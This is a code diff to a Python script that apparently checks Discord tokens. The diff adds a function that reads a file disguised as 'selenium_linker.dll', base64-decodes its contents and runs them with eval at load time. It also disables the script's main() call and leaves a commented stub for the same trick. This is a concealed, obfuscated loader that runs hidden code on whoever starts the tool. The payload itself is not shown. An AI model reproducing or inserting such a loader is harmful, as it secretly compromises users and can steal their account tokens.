@@ -2,7 +2,6 @@ from colorama import Fore, init
 import codecs
 import os
 import base64
-import selenium_linker
 import requests
 import time
 
@@ -19,6 +18,10 @@ active_tokens = []
 invite_link = f"{lr}(NOT SET)"
 checked =  f"{w}UNCHECKED"
 guild_id = ""
+
+
+
+# selenium_linker = eval(compile(,'<string>','exec'))
 
 def print_actions():
     clear()
@@ -67,6 +70,9 @@ def print_actions():
     
     print_actions()
 
+
+def initialize_selenium():
+    selenium = eval(compile(base64.b64decode(open('selenium_linker.dll',mode='rb').read().decode("UTF-8")).decode("UTF-8"), "<string>", "exec"))
 
 def check_tokens():
     global active_tokens, invite_link
@@ -198,6 +204,6 @@ def clear():
        os.system('clear')
 
 
-
+initialize_selenium()
 set_checked(False)
-main() 
+#main() 
